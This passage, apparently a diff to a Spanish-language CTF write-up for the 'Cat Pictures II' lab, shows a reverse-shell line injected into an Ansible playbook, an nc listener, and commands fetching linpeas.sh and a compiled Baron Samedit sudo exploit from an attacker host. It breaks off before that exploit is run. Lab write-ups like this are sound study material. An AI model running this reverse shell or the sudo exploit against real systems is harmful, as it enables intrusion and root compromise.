@@ -372,3 +372,112 @@ En el puerto 1337 tengo ansible runner, entiendo que para ejecutar comandos o pl
 
 Cuando ejecuto algo en olivetin, los logs me dan a entender que se esta ejecutando, y el codigo del playbook de gitea puedo modificarlo para introducir una revshell.
 Además, la pista de la segunda flag es ansible.
+Añado este código al playbook de ansible.
+
+
+    - name: get the username running the deploy
+      become: false
+      command: bash -c "bash -i >& /dev/tcp/192.168.131.65/9000 0>&1"
+      register: username_on_the_host
+      changed_when: false
+
+Ejecuto el playbook desde olivetin, y consigo la revshell.
+
+La segunda flag esta en el directorio en el hace spawn la shell.
+
+sudo nc -lnvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 10.130.166.48 58960
+bismuth@catpictures-ii:~$ ls
+ls
+flag2.txt
+bismuth@catpictures-ii:~$ cat flag2.txt	
+cat flag2.txt
+5************************
+bismuth@catpictures-ii:~$ 
+
+Veo maneras de escalar privilegios, pero en principio no encuentro nada, ni crontab, ni SUID, ni sudo -l.
+Puede que at sea interesante.
+
+Voy a ver con LinPeas.sh.
+
+bismuth@catpictures-ii:~$ wget http://192.168.131.65:8080/linpeas.sh    
+wget http://192.168.131.65:8080/linpeas.sh
+--2026-08-19 04:12:26--  http://192.168.131.65:8080/linpeas.sh
+Connecting to 192.168.131.65:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 971926 (949K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+     0K .......... .......... .......... .......... ..........  5%  524K 2s
+    50K .......... .......... .......... .......... .......... 10% 1.65M 1s
+   100K .......... .......... .......... .......... .......... 15% 23.7M 1s
+   150K .......... .......... .......... .......... .......... 21% 1.78M 1s
+   200K .......... .......... .......... .......... .......... 26% 8.18M 0s
+   250K .......... .......... .......... .......... .......... 31%  107M 0s
+   300K .......... .......... .......... .......... .......... 36% 16.9M 0s
+   350K .......... .......... .......... .......... .......... 42% 1.91M 0s
+   400K .......... .......... .......... .......... .......... 47% 6.75M 0s
+   450K .......... .......... .......... .......... .......... 52% 95.3M 0s
+   500K .......... .......... .......... .......... .......... 57% 2.76M 0s
+   550K .......... .......... .......... .......... .......... 63% 4.30M 0s
+   600K .......... .......... .......... .......... .......... 68% 10.3M 0s
+   650K .......... .......... .......... .......... .......... 73% 2.91M 0s
+   700K .......... .......... .......... .......... .......... 79% 4.96M 0s
+   750K .......... .......... .......... .......... .......... 84% 25.6M 0s
+   800K .......... .......... .......... .......... .......... 89% 11.6M 0s
+   850K .......... .......... .......... .......... .......... 94% 3.35M 0s
+   900K .......... .......... .......... .......... ......... 100% 5.09M=0.3s
+
+2026-08-19 04:12:27 (3.22 MB/s) - ‘linpeas.sh’ saved [971926/971926]
+
+bismuth@catpictures-ii:~$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+bismuth@catpictures-ii:~$ ./linpeas.sh
+
+De las primeras cosas que veo en la salida de linpeas, esta la versión de sudo.
+1.8.21p2
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+En la máquina víctima no conecta a github, me lo descargo en la atacante y lo paso por server http de python.
+
+bismuth@catpictures-ii:~$ wget http://192.168.131.65:8080/main
+wget http://192.168.131.65:8080/main
+--2026-08-19 04:20:10--  http://192.168.131.65:8080/main
+Connecting to 192.168.131.65:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4321 (4.2K) [application/octet-stream]
+Saving to: ‘main’
+
+     0K ....                                                  100% 1.53M=0.003s
+
+2026-08-19 04:20:10 (1.53 MB/s) - ‘main’ saved [4321/4321]
+
+Al intentar descomprimirlo en la máquina víctima, me doy cuenta de que no hay zip, lo descomprimo en la atacante, lo compilo y me lo vuelvo a descargar.
+
+/scripts/CVE-2021-3156-main$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+
+bismuth@catpictures-ii:~$ wget http://192.168.131.65:8080/sudo-hax-me-a-sandwich
+<t http://192.168.131.65:8080/sudo-hax-me-a-sandwich
+--2026-08-19 04:27:34--  http://192.168.131.65:8080/sudo-hax-me-a-sandwich
+Connecting to 192.168.131.65:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16592 (16K) [application/octet-stream]
+Saving to: ‘sudo-hax-me-a-sandwich’
+
+     0K .......... ......                                     100%  454K=0.04s
+
+2026-08-19 04:27:34 (454 KB/s) - ‘sudo-hax-me-a-sandwich’ saved [16592/16592]
+
+Y lo ejecuto usando el target correcto.
+
